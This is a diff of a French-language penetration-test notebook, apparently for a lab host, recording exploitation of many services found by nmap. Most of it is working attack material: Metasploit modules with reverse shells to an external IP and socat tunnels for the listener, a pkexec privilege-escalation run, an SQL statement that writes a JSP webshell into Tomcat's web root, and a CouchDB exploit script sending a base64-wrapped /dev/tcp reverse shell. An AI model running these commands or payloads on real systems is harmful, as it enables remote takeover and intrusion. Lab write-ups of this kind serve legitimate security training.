@@ -1,5 +1,16 @@
+
+## IP du serveur
+
+```
+18.158.110.24
+```
+
 ## NMAP
 
+Résultat du nmap:
+```
+nmap -sT -sV -Pn -T4 -p- -oA nmap-all-port.txt 18.158.110.24
+```
 ```
 # Nmap 7.98 scan initiated Mon Apr 13 15:38:52 2026 as: nmap -sT -sV -Pn -T4 -p- -oA nmap-all-port.txt 18.158.110.24
 Nmap scan report for xmshop.lab (18.158.110.24)
@@ -140,10 +151,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 
-```
-18.158.110.24
-```
-
 ## Port 8080
 
 ### [Tomcat RCE](https://github.com/psmiraglia/ctf/blob/master/kevgir/001-tomcat.md)
@@ -152,7 +159,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 tomcat:password
 ```
 
-Sur exegol:
+### Sur Metasploit:
 
 ```
 use exploit/multi/http/tomcat_mgr_upload
@@ -163,32 +170,26 @@ set RPORT 8080
 set HttpUsername tomcat
 set HttpPassword password
 
-set payload java/meterpreter/reverse_tcp
+set payload payload/java/shell_reverse_tcp
 
-set LPORT 6667
-set ReverseListenerBindAddress 0.0.0.0  
+set LPORT 8889
 set LHOST 212.129.9.19
 
 exploit
 ```
 
-```
-use exploit/multi/handler  
-set payload java/meterpreter/reverse_tcp  
-set LHOST 0.0.0.0  
-set LPORT 4444  
-run
-```
 
-Sur pentest echo:
+### Sur pentest echo:
 
 ```
-ssh -R 6666:127.0.0.1:4444 echo
-socat TCP-LISTEN:6667,fork TCP:127.0.0.1:6666
-neo iptables open 6667
+ssh -R 7777:127.0.0.1:6666 echo
+socat TCP-LISTEN:8889,fork TCP:127.0.0.1:7777
+neo iptables open 8889
 ```
 
-![[Pasted image 20260410145621.png]]
+### Sur le pc local 
+
+![[Pasted image 20260414163020.png]]
 
 ### [Privesc SUID pkexec](https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c)
 
@@ -226,34 +227,39 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-meterpreter 
-
+Commande sur le reverse shell depuis pwncat:
 ```
 upload /workspace/pentest-linux/pwnkit.c /tmp/pwnkit.c
 gcc pwnkit.c -o poc
 ./poc
 ```
 
-![[Pasted image 20260410151752.png]]
+![[Pasted image 20260414164130.png]]
+
 
 ## Port 9080
 
+Creds par défaut:
 ```
 admin:admin
 ```
-
+Accès à l'interface administrateur:
 ![[Pasted image 20260410155748.png]]
 
-### [JexBoss](https://github.com/joaomatosf/jexboss)
+### [RCE JexBoss](https://github.com/joaomatosf/jexboss)
 
+Exécution du script:
 ![[Pasted image 20260410171232.png]]
 
-![[Pasted image 20260410171244.png]]
+Résultat:
+![[Pasted image 20260414164335.png]]
 
 ## Port 5432
 
+Accès à postgres sans identifiant:
 ![[Pasted image 20260410173229.png]]
 
+Utilisation de métasploit:
 ```
 use exploit/linux/postgres/postgres_payload
 
@@ -272,22 +278,31 @@ set TARGET 1
 exploit
 ```
 
-![[Pasted image 20260410181605.png]]
+Sur pentest echo:
+```
+ssh -R 7777:127.0.0.1:6666 echo
+socat TCP-LISTEN:8889,fork TCP:127.0.0.1:7777
+neo iptables open 8889
+```
 
-![[Pasted image 20260410181616.png]]
+Reverse shell sur pwncat:
+![[Pasted image 20260414164611.png]]
 
 ## Port 23
 
+Connexion à la machine via telnet avec des identifiants triviaux:
 ![[Pasted image 20260413110538.png]]
 
-## Port 4369
+![[Pasted image 20260414164949.png]]
 
-### [RCE Erlang](https://github.com/gteissier/erl-matter)
+## Port 4369
 
 ```
 4369/tcp  open  epmd           Erlang Port Mapper Daemon
 ```
+### [RCE Erlang](https://github.com/gteissier/erl-matter)
 
+Découverte du nœud Erlang RabbitMQ via EPMD
 ```
 nmap --script epmd-info -p 4369 18.158.110.24
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 15:46 +0200
@@ -304,7 +319,9 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
 ```
 
+Pour exploiter cette RCE, un attaquant doit être en mesure de récupérer le Erlang Cookie sur le serveur. 
 
+Utilisation de metasploit: 
 ```
 use exploit/multi/misc/erlang_cookie_rce
 set RHOSTS 18.158.110.24
@@ -319,10 +336,80 @@ set DisablePayloadHandler true
 
 ![[Pasted image 20260413155044.png]]
 
+Reverse shell en local:
 ![[Pasted image 20260413155134.png]]
 
+## Port 21
+
+### [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
+
+Bind shell sur le port 6200 du serveur. Ce port est ouvert via une backdoor déclenchable lors de l'authentification au service FTP:
+![[Pasted image 20260414111957.png]]
 
 
+## Port 3306
 
+Connexion à MySQL avec des privilèges élevés + Service MySQL tourne en root sur le serveur:
+Upload d'un webshell sur l'un des serveur web présent.
 
+[Web Shell JAVA](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp)
 
+Commande SQL pour ajouter un fichier shell.jsp dans le web root de Tomcat 
+
+```
+SELECT "<%@ page import=\"java.util.*,java.io.*\"%><% if(request.getParameter(\"cmd\")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } } %>"
+INTO OUTFILE '/usr/share/tomcat6/webapps/ROOT/shell.jsp';
+
+```
+
+![[Pasted image 20260414151608.png]]
+
+## Port 5984
+
+### [POC CVE-2017-12636](https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py)
+
+```python
+#!/usr/bin/env python3
+import requests
+import json
+import base64
+from requests.auth import HTTPBasicAuth
+
+target = 'http://18.158.110.24:5984'
+command = rb"""sh -i >& /dev/tcp/212.129.9.19/8888 0>&1"""
+version = 1
+
+session = requests.session()
+session.headers = {
+    'Content-Type': 'application/json'
+}
+# session.proxies = {
+#     'http': 'http://127.0.0.1:8085'
+# }
+session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
+  "type": "user",
+  "name": "wooyun",
+  "roles": ["_admin"],
+  "roles": [],
+  "password": "wooyun"
+}''')
+
+session.auth = HTTPBasicAuth('wooyun', 'wooyun')
+
+command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
+if version == 1:
+    session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
+else:
+    host = session.get(target + '/_membership').json()['all_nodes'][0]
+    session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))
+
+session.put(target + '/wooyun')
+session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')
+
+if version == 1:
+    session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
+else:
+    session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
+```
+
+![[Pasted image 20260414173124.png]]
